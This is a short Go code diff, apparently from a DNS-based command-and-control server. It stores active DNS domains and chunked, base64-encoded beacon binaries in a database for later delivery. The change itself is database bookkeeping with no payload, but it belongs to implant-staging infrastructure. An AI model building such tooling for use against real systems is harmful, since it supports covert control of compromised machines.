@@ -1266,8 +1266,23 @@ func (api *APIServer) loadAndProcessClientBinary(osType, arch string) (string, s
 
 	fmt.Printf("[Master] Will split into %d chunks of %d bytes each\n", totalChunks, chunkSize)
 
+	// Get active DNS domains for the client_binaries record
+	dnsServers, err := api.db.GetDNSServers()
+	var dnsDomains []string
+	if err == nil {
+		for _, server := range dnsServers {
+			if status, ok := server["status"].(string); ok && status == "active" {
+				if domain, ok := server["domain"].(string); ok {
+					dnsDomains = append(dnsDomains, domain)
+				}
+			}
+		}
+	}
+	dnsDomainsStr := strings.Join(dnsDomains, ",")
+
 	// Ensure this beacon exists in client_binaries table (needed for foreign key constraint)
-	err = api.db.UpsertClientBinary(beaconID, filepath.Base(clientPath), osType, arch, len(clientData), len(compressed), len(base64Data))
+	err = api.db.UpsertClientBinary(beaconID, filepath.Base(clientPath), osType, arch,
+		len(clientData), len(compressed), len(base64Data), totalChunks, base64Data, dnsDomainsStr)
 	if err != nil {
 		return "", "", 0, fmt.Errorf("failed to register client binary in database: %w", err)
 	}
